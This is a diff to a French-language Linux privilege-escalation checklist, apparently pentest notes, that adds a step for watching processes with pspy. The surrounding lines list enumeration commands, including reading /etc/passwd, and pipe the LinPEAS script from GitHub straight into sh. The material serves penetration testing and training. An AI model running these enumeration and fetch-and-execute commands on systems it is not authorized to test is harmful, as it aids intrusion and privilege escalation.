@@ -144,11 +144,19 @@ whoami; id; sudo -l; uname -a; cat /etc/os-release; ip a; cat /etc/passwd | grep
 5. `crontab -l` + `/etc/cron.d/` → tâches automatiques exploitables
 6. `ps aux` → process root en cours, pistes de hijack
 7. Puis lancer **LinPEAS** pour croiser tout automatiquement
-
+8. Etudier les processus avec pspy
+   
 ```bash
 # LinPEAS - le plus complet, à privilégier en premier
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
 # ou upload puis exécution locale
 ./linpeas.sh -a > linpeas_output.txt
+```
+
+```bash
+# Pspy pour 
+git clone https://github.com/dominicbreuker/pspy
+
+# charger l'executable en fonctoin du system et le lancer pour voir les ps exploitables
 ```
